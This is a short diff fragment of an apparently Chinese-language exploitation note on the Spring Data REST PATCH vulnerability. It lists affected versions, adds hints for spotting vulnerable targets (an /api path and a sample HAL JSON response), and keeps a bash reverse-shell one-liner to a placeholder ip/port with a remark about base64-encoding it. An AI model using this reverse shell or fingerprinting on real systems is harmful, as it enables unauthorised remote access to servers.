@@ -5,6 +5,19 @@ Spring-data-rest服务器在处理PATCH请求时，攻击者可以构造恶意�
 Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3
 Spring Boot version ≤ 2.0.0M4
 Spring Data release trains < Kay-RC3
+
+特征spring，有/api目录
+响应如：
+```
+{
+"_links": {
+"people": {
+"href": "https://xx/api/people{?page,size,sort}",
+"templated": true
+}
+```
+
+
 ```
 bash -i >& /dev/tcp/ip/port 0>&1
 base64一下：
